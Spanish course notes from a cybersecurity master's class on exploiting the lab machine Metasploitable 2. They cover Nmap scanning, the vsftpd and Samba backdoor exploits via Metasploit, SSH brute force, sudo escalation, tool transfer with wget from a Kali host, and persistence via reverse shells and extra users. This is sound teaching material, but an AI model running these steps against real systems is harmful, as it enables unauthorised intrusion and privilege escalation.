> [!info] Ficha tÃ©cnica
> **MÃ¡ster de Ciberseguridad e Inteligencia Artificial** Â· **Clase 21**
> **MÃ³dulo:** MODULO3
> **Tema:** Clase 21
> **Fuente:** Apuntes Joselu Â· Evolve Academy

> [!tip] CÃ³mo leer estos apuntes
> Resumen estructurado de la clase 21. Contenido optimizado para estudio activo y repaso rÃ¡pido antes de exÃ¡menes.

---

---

--
MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy

## 1.

Contexto y objetivos de la sesiÃ³n

El profesor **Dani** retoma el trabajo sobre **Metasploitable 2** (se descarta la versiÃ³n 3 que dio problemas la clase anterior).

Esta sesiÃ³n es la continuaciÃ³n directa de la clase de reconocimiento y enumeraciÃ³n: si en aquella se aprendiÃ³ a descubrir hosts, escanear puertos e identificar versiones, hoy se aplica todo eso en la prÃ¡ctica explotando uno a uno los servicios expuestos.

El enfoque no es recetas de cocina sino **metodologÃ­a real de pentester**: para cada servicio se exploran todas las vÃ­as de entrada, se usan tanto Metasploit como scripts en Python, y se llega hasta la escalada de privilegios a root.

> [!note] **MetodologÃ­a repasada:** dos escaneos Nmap complementarios: 1. nmap -p- \--min-rate 5000 IP â†’ descubrir todos los puertos abiertos rÃ¡pidamente. 2. nmap -p 21,22,23,\... -sV -sC IP â†’ anÃ¡lisis en profundidad solo de los puertos encontrados. - -sV: detecta versiones de los servicios. - -sC: lanza scripts NSE bÃ¡sicos (detecta sesiones anÃ³nimas FTP, etc.). - Nota: -sVC escrito junto equivale a -sV -sC por separado.

## 2.

Las cinco fases de una auditorÃ­a

Antes de entrar en los exploits, Daniel introduce el marco metodolÃ³gico que estructura toda la prÃ¡ctica:

Fase DescripciÃ³n Herramientas
 ---------------------------------- --------------------------------------------------- --------------------------------------------
1\.

Reconocimiento Descubrir quÃ© hay en la red ifconfig, netdiscover, arp-scan, ping + TTL 2\.

EnumeraciÃ³n Identificar servicios y versiones de cada host nmap -sCV, smbclient, FTP anÃ³nimo 3\.

AnÃ¡lisis de vulnerabilidades Buscar si las versiones tienen exploits conocidos searchsploit, Exploit-DB 4\.

ExplotaciÃ³n Usar los exploits para obtener acceso Metasploit, scripts Python, Hydra 5\.

Post-explotaciÃ³n Escalar privilegios y mantener el acceso sudo -l, GTFOBins, persistencia

> [!important] **DistinciÃ³n clave:** la *explotaciÃ³n* es entrar al sistema con cualquier usuario; la *post-explotaciÃ³n* es todo lo que ocurre despuÃ©s para aumentar el control (escalada de privilegios, persistencia, movimiento lateral).

## 3.

FTP (puerto 21) -- vsftpd 2.3.4: tres vectores, tres demostraciones

Nmap con -sCV detecta automÃ¡ticamente que el servicio FTP corre la versiÃ³n **vsftpd 2.3.4**, que tiene una backdoor conocida desde 2011 catalogada en Exploit-DB y disponible como mÃ³dulo en Metasploit.

### Regla general para FTP

Para FTP existen exactamente **tres vectores de ataque**: 1. **SesiÃ³n anÃ³nima** activa 2. **VersiÃ³n vulnerable** con exploit conocido 3. **Credenciales obtenidas** por otro medio (otro puerto, filtraciÃ³n, phishing)

Si ninguno de los tres aplica, el FTP no ofrece mÃ¡s superficie de ataque de forma aislada.

### Vector 1 --- SesiÃ³n anÃ³nima

Nmap con -sC indica en su output si el FTP permite login anÃ³nimo.

Para comprobarlo manualmente:

ftp IP_OBJETIVO

# Usuario: anonymous

# ContraseÃ±a: (vacÃ­a)

Comandos Ãºtiles dentro del FTP: dir / ls para listar, get para descargar, put para subir.

**El peligro real:** si la carpeta del FTP es accesible desde la web, un atacante puede subir una reverse shell en PHP, ejecutarla desde el navegador y obtener ejecuciÃ³n remota de cÃ³digo.

La sesiÃ³n anÃ³nima + el puerto 80 se convierten en RCE.

### Vector 2 --- Exploit de la versiÃ³n (Metasploit)

msfconsole search vsftpd 2.3.4 use 0 show options set RHOSTS IP_OBJETIVO # IP de la mÃ¡quina vÃ­ctima set LHOST IP_KALI # IP de nuestra Kali (donde recibiremos la conexiÃ³n) run

Al lanzar el exploit aparece el mensaje "**backdoor has been spawned**".

Esto significa que la backdoor ha creado una puerta trasera: el equipo vÃ­ctima ha abierto una conexiÃ³n de vuelta hacia nosotros.

Dentro del **Meterpreter**:

shell # Obtener una shell interactiva del sistema whoami # â†’ root (directamente, sin escalar) ls pwd

**Error habitual:** si aparece "*exploit completed, but no session was created*", comprobar que no hay una sesiÃ³n FTP anÃ³nima abierta en otra terminal; cerrarla con exit antes de relanzar.

### Vector 3 --- Script en Python (sin Metasploit)

searchsploit muestra el mismo exploit disponible tambiÃ©n como script en Python.

### Para usarlo:

locate vsftpd # Encontrar la ruta completa del script cp /ruta/completa/script.py . # Copiar al directorio de trabajo (no modificar el original) python3 script.py -h IP_OBJETIVO # Lanzar el exploit

**Si el script falla por velocidad excesiva** (la conexiÃ³n va demasiado rÃ¡pido y no espera la respuesta), aÃ±adir un delay:

nano script.py

AÃ±adir al inicio: import time AÃ±adir tras la lÃ­nea de conexiÃ³n: time.sleep(2) Guardar: Ctrl+O â†’ Enter â†’ Ctrl+X

python3 script.py -h IP_OBJETIVO # Relanzar con el delay whoami # â†’ root

### CombinaciÃ³n FTP + Puerto 80 â†’ RCE

Si los archivos subidos al FTP se sirven desde la aplicaciÃ³n web (es decir, aparecen accesibles en alguna ruta del tipo /files/, /blog/, /ftp/...), subir un archivo PHP malicioso por FTP y ejecutarlo desde el navegador produce una **reverse shell** como el usuario del servidor web.

Es la combinaciÃ³n mÃ¡s peligrosa del servicio FTP.

AnalogÃ­a del profesor: "*el FTP es la pistola (tiene los archivos), la web es la municiÃ³n (los ejecuta).

Por separado no hacen nada; juntos, matan.*"

## 4.

Telnet (puerto 23) -- Credenciales en texto claro

Telnet es un protocolo de gestiÃ³n remota similar a SSH pero **sin cifrado**, completamente obsoleto.

El vector de ataque es intentar la conexiÃ³n directamente:

telnet IP_OBJETIVO

Metasploitable 2 tiene una **mala configuraciÃ³n grave**: al conectar, muestra en pantalla el usuario y la contraseÃ±a con los que hay que autenticarse.

En un servidor bien configurado esto no ocurrirÃ­a nunca.

Con msfadmin / msfadmin:

whoami # â†’ msfadmin (usuario normal, no root)

## 5.

Escalada de privilegios desde usuario normal

Una vez dentro como cualquier usuario sin privilegios (desde Telnet, SSH o cualquier otra vÃ­a), el primer diagnÃ³stico siempre es:

```bash
sudo -l
```

Este comando muestra quÃ© comandos puede ejecutar el usuario actual con permisos de root.

En Metasploitable 2 muestra (ALL) ALL --- es decir, msfadmin puede ejecutar absolutamente cualquier cosa como root.

ConfiguraciÃ³n pÃ©sima.

La escalada es inmediata:

```bash
sudo su whoami # â†’ root
```

**MetÃ¡fora Ãºtil:** sudo -l es revisar quÃ© llaves tiene el usuario.

Si tiene la llave maestra (ALL), no hay barrera.

Si solo tiene la llave del almacÃ©n, **GTFOBins** explica cÃ³mo usar esa llave para copiar la maestra.

### GTFOBins (gtfobins.github.io)

Referencia de tÃ©cnicas de escalada de privilegios en Linux.

Cuando sudo -l muestra un comando concreto permitido (Python, Vim, Ncat, find, tar...), GTFOBins documenta cÃ³mo usarlo para obtener una shell como root.

### Escalada mediante cron jobs + archivos modificables

Si existe una tarea programada (cron job) que se ejecuta como root y el usuario actual tiene permisos de escritura sobre el script que esa tarea ejecuta, se puede insertar una reverse shell en ese script.

Cuando el cron lo ejecute, la shell llegarÃ¡ con privilegios de root.

## 6.

SSH (puerto 22) -- Fuerza bruta con Metasploit

Para demostrar que Metasploit no solo sirve para lanzar exploits, se usa su mÃ³dulo de escaneo de login SSH.

Primero se crean los diccionarios:

nano usuarios.txt # msfadmin, admin, admins nano passwords.txt # msfadmin, password, admin

En Metasploit:

msfconsole search ssh_login # MÃ³dulo auxiliar (no exploit) use [nÃºmero] show options set RHOSTS IP_OBJETIVO set USER_FILE /ruta/usuarios.txt set PASS_FILE /ruta/passwords.txt set STOP_ON_SUCCESS true # Para en cuanto encuentre credenciales vÃ¡lidas run

**Diferencia importante respecto al exploit de FTP:** el mÃ³dulo ssh_login no abre la shell automÃ¡ticamente; guarda las credenciales vÃ¡lidas como una sesiÃ³n activa en Metasploit.

### GestiÃ³n de sesiones en Metasploit

sessions -l # Listar todas las sesiones activas sessions -i 1 # Entrar en la sesiÃ³n nÃºmero 1 (interact) Ctrl+Z # Enviar la sesiÃ³n al background sin cerrarla

Esto permite tener mÃºltiples sesiones abiertas simultÃ¡neamente (a distintas mÃ¡quinas o con distintos usuarios) y gestionarlas todas desde el mismo Metasploit.

Las sesiones persisten mientras no se cierre el framework con exit.

Una vez dentro por SSH como msfadmin, la escalada es idÃ©ntica: sudo -l â†’ (ALL) ALL â†’ sudo su â†’ root.

## 7.

GestiÃ³n de procesos y puertos

### Comprobar si un puerto estÃ¡ ocupado

ss -antp | grep PUERTO # Ver conexiones TCP filtradas por puerto ps aux | grep PUERTO # Ver proceso asociado

ParÃ¡metros de ss -antp: -a todas las conexiones, -n formato numÃ©rico, -t solo TCP, -p muestra el PID del proceso.

### Matar un proceso

kill -9 PID

### Servidor HTTP instantÃ¡neo con Python

python3 -m http.server PUERTO

Publica el contenido del directorio actual como un servidor web.

Uso prÃ¡ctico en auditorÃ­as: cuando la mÃ¡quina comprometida no tiene acceso a Internet pero sÃ­ visibilidad con Kali, se pueden transferir herramientas o exploits desde Kali usando este servidor.

La mÃ¡quina vÃ­ctima los descarga con:

```bash
wget http://IP_KALI:PUERTO/herramienta
```

## 8.

SMB/Samba (puertos 139 y 445)

SMB (*Server Message Block*), implementado en Linux como **Samba**, es el protocolo para compartir recursos en red: carpetas, impresoras, ficheros.

Muy relevante en entornos de directorio activo Windows pero tambiÃ©n presente en servidores Linux.

### EnumeraciÃ³n de recursos compartidos

smbclient -N -L //IP_OBJETIVO/

- -N: sin credenciales (sesiÃ³n anÃ³nima)
- -L: listar recursos compartidos

El resultado en Metasploitable 2 muestra: drivers de impresoras, carpeta /tmp, /opt, disco C.

En auditorÃ­as reales se encuentran frecuentemente carpetas compartidas con nÃ³minas, credenciales, documentaciÃ³n interna o rutas sensibles.

### Obtener la versiÃ³n de Samba sin Nmap

Metasploit tiene un mÃ³dulo escÃ¡ner que detecta la versiÃ³n SMB:

msfconsole search smb_version use [nÃºmero] set RHOSTS IP_OBJETIVO run # Devuelve la versiÃ³n de Samba

### ExplotaciÃ³n de la versiÃ³n vulnerable (Samba 3.0.20)

searchsploit Samba 3.0.20 msfconsole search Samba 3.0.20 use [nÃºmero] show options set RHOSTS IP_OBJETIVO run

Resultado: sesiÃ³n directamente **como root**, sin necesidad de escalada de privilegios.

Uno de los vectores mÃ¡s directos de toda Metasploitable 2.

Ctrl+Z # SesiÃ³n al background sessions -l # Listar sesiones sessions -i 1 # Entrar en la sesiÃ³n

## 9.

Puerto 80 (HTTP) -- Primera toma de contacto y fuzzing de directorios

El puerto 80 expone una aplicaciÃ³n web.

Navegar a http://IP_OBJETIVO muestra lo visible en la raÃ­z, pero muchos directorios y ficheros existen sin estar enlazados desde la pÃ¡gina principal.

### FFUF: fuzzing de directorios

ffuf -u http://IP_OBJETIVO/FUZZ -w /usr/share/dirb/wordlists/common.txt -c

- FUZZ: marcador que se sustituye por cada palabra del diccionario.
- -w: diccionario a usar.
- -c: colorear el output.

Para buscar **subdominios** en vez de subdirectorios, mover el marcador:

ffuf -u http://FUZZ.dominio.com/ -w /ruta/diccionario

**Otras herramientas equivalentes:** DirBuster (GUI), Feroxbuster (recursivo), Gobuster.

**Diccionarios recomendados:** - /usr/share/dirb/wordlists/common.txt --- incluido con Kali, ligero. - **SecLists** (directory-list-2.3-medium.txt de DirBuster) --- colecciÃ³n mÃ¡s completa con listas especializadas por servicio (usuarios, contraseÃ±as, fuzzing web, SQL Injection, LFI, WordPress...).

â†’

### Hallazgos del fuzzing en Metasploitable 2

El fuzzing encuentra, entre otros: - /phpinfo.php --- **siempre reportar en una auditorÃ­a real.** Este archivo, que PHP genera para diagnÃ³stico y deberÃ­a eliminarse en producciÃ³n, expone: versiÃ³n exacta de PHP, versiÃ³n del sistema operativo Ubuntu, versiÃ³n del servidor Apache, rutas internas del sistema y si **CGI estÃ¡ habilitado**. - Directorios adicionales no visibles en el Ã­ndice principal.

### CGI habilitado â†’ RCE en la prÃ³xima clase

**CGI habilitado** permite enviar peticiones GET que el servidor web interpreta como comandos.

Esto abre la puerta a ejecutar cÃ³digo remotamente y obtener una reverse shell.

El usuario resultante serÃ¡ www-data (cuenta de servicio web, no root), desde donde habrÃ¡ que escalar privilegios.

robots.txt: siempre revisarlo al auditar una web --- lista las rutas que el administrador no quiere que indexen los buscadores, que paradÃ³jicamente suelen ser las mÃ¡s interesantes.

### CÃ³digos de estado HTTP relevantes

CÃ³digo Significado
 ----------- ---------------------------------------
200 OK -- recurso encontrado 301 / 302 RedirecciÃ³n 403 Forbidden -- existe pero no hay acceso 404 Not Found -- no existe

## 10.

Exploit-DB, CVEs y scripts NSE de Nmap

**Exploit-DB** (exploit-db.com) --- base de datos de exploits mantenida por Offensive Security (creadores de Kali).

Cada vulnerabilidad tiene asignado un **CVE** (*Common Vulnerabilities and Exposures*) y una puntuaciÃ³n de criticidad **CVSS** (*Common Vulnerability Scoring System*, de 0 a 10).

searchsploit --- herramienta de Kali que busca localmente en la base de datos de Exploit-DB sin acceso a Internet.

**Scripts NSE de Nmap:** ubicados en /usr/share/nmap/scripts/, escritos en **Lua**.

Se pueden usar individualmente:

```bash
nmap --script ftp-anon IP nmap --script nombre_del_script IP
```

Se pueden crear scripts propios en Lua para automatizar comprobaciones personalizadas.

## 11.

Fases de la auditorÃ­a --- resumen visual

Reconocimiento (netdiscover, arp-scan, ping+TTL) â†“ EnumeraciÃ³n (nmap -p- â†’ nmap -sCV, smbclient, ftp anonymous) â†“ AnÃ¡lisis de vulnerabilidades (searchsploit, search en Metasploit, Exploit-DB) â†“ ExplotaciÃ³n (Metasploit, scripts Python, Hydra, telnet, ftp) â†“ Post-explotaciÃ³n / Escalada de privilegios (sudo -l â†’ sudo su, GTFOBins, cron jobs) â†“ Persistencia (reverse shells ocultas, usuarios adicionales, sesiones en background con Ctrl+Z)

## 12.

Novedades de la plataforma Evolve

Las clases pasadas ya no estÃ¡n en "PrÃ³ximas Sesiones".

Hay que acceder desde la **Biblioteca de Sesiones** del menÃº de la plataforma, donde estÃ¡n todas las grabaciones editadas en alta calidad con el chat incluido, organizadas por mÃ³dulos con resÃºmenes de cada clase.

El nuevo responsable tÃ©cnico del mÃ¡ster es **Ãlvaro**.

## 13.

Conceptos y tÃ©rminos clave corregidos

TÃ©rmino en la transcripciÃ³n CorrecciÃ³n / AclaraciÃ³n
 ---------------------------------------------- ----------------------------------------------------------------------------------------------
metaexplotable / MetaProtable / metaspotabro **Metasploitable 2** -- mÃ¡quina Linux intencionalmente vulnerable para prÃ¡ctica de pentesting MetaSployed / Mensaje Console / MSF Console **Metasploit Framework / msfconsole** -- framework de explotaciÃ³n Meter preter / metterpretter **Meterpreter** -- shell avanzada de Metasploit REVSSL / reverse-sell / SELA **Reverse shell** -- conexiÃ³n de retorno desde la vÃ­ctima al atacante Search Explory / Salesployed / Sprout TV **searchsploit** -- buscador local de Exploit-DB saarch exploit / saarch explorite **search** -- comando interno de bÃºsqueda en Metasploit SMV / SMS / SMG **SMB** (*Server Message Block*) -- protocolo de comparticiÃ³n de recursos FFUF / FVFVF / FFF **FFUF** (*Fuzz Faster U Fool*) -- herramienta de fuzzing web DeepBuster / DeerBuster / DirtBuster **DirBuster** -- herramienta de fuzzing de directorios web (tambiÃ©n diccionario de SecLists) Feroxbaxter / Ferous Baxter **Feroxbuster** -- herramienta de fuzzing web recursivo GoBuster / Go Baster **Gobuster** -- herramienta de fuzzing web GTFOBins / GTF o BINS **GTFOBins** (gtfobins.github.io) -- referencia de tÃ©cnicas de escalada por binarios ZWS / ZV / moneda **CVSS / CVE** -- mÃ©tricas y nomenclatura estÃ¡ndar de vulnerabilidades LCH / SCH / ternet / ethernet **SSH / Telnet** -- protocolos de acceso remoto (seguro y sin cifrado respectivamente) JuanMy / Juan May / Juamai **whoami** -- muestra el usuario actual SUO menos L / sube menos L **sudo -l** -- lista los comandos permitidos con privilegios de root footing / fousing / fusear **fuzzing** -- enumeraciÃ³n web por fuerza bruta de rutas y directorios check list / sek list / seclis **SecLists** -- colecciÃ³n de wordlists para pentesting Claudia / Claude / Claudio / la IA **Claude** (Anthropic) -- IA usada para scripting y consultas durante la clase Oficinas Security / Offensive **Offensive Security** -- empresa creadora de Kali Linux y las certificaciones OSCP Ãlvaro / teachasisdom **Ãlvaro** -- nuevo responsable tÃ©cnico del mÃ¡ster en Evolve Academy

Resumen elaborado para uso acadÃ©mico en el MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.

â†’

â†’

â†’
